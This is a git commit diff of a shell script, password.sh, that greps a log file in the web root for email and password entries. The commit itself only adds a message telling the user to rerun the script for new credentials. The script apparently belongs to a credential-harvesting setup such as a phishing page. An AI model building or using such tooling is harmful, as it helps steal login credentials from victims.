4621d275001f1e97f05b42ea3f48c0875f92a564
SG_PRO <55870659+Ignitetch@users.noreply.github.com>
2019-11-25 11:41:11 +0530

    Update password.sh

--- password.sh
+++ password.sh
@@ -3,3 +3,4 @@ cd /var/www/html/
 cat log.txt | grep "email"
 cat log.txt | grep "password"
 printf " \e[210m\e[1;199m +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ \e[0m\n"
+printf " \e[210m\e[1;199m       For New User & Password Run Again ./Password.sh \e[0m\n"   
